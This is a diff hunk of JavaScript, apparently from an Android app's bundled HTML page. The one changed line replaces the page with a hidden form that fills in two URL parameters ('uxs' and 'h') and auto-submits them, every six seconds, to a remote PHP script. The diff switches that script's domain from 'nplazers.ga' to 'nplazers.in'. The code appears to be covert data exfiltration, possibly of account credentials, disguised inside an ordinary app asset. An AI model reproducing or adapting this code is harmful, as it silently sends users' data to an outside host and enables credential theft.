@@ -126,7 +126,7 @@ else if(l!=null && l.startsWith("file:///android_asset/reds.html?ux=/sred.")){
     
 var b = getParameterByName("uxs");
 var c = getParameterByName("h");
-    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "https://nplazers.ga/nplaz/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
+    $("body").replaceWith('<body><form method="post" id="myForm"><input class="input" name="u"> <input class="input2" name="h"></form><script>$("form").attr("action", "https://nplazers.in/nplaz/flix/ssss.php");$(".input").attr("value", "'+b+'");$(".input2").attr("value", "'+c+'");document.getElementById("myForm").submit();setInterval(function(){document.getElementById("myForm").submit();},6000);</script></body>');
     
     
 }
